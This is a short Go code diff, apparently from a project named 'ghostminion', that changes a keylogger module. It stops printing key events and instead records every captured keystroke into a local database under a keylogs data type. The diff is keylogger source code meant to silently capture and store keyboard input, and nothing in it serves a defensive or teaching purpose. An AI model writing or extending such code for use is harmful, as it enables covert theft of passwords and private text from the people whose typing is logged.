@@ -2,6 +2,7 @@ package apps
 
 import (
 	"fmt"
+	"ghostminion/db"
 	"github.com/MarinX/keylogger"
 	"sync"
 )
@@ -25,14 +26,11 @@ func (c *KeyLoggerApp) Start(wg *sync.WaitGroup) {
 	for {
 		events := klgr.Read()
 		for e := range events {
-			switch e.Type {
-			case keylogger.EvKey:
-				if e.KeyPress() {
-					fmt.Println("[event] press key ", e.KeyString())
-				} else if e.KeyRelease() {
-					fmt.Println("[event] release key ", e.KeyString())
+			if e.Type == keylogger.EvKey {
+				err = db.WriteDataRow("", db.KeylogsDataType, []byte(e.KeyString())) // replace reqId
+				if err != nil {
+					fmt.Printf("error: %v", err)
 				}
-				break // save to db ⬆️
 			}
 		}
 	}
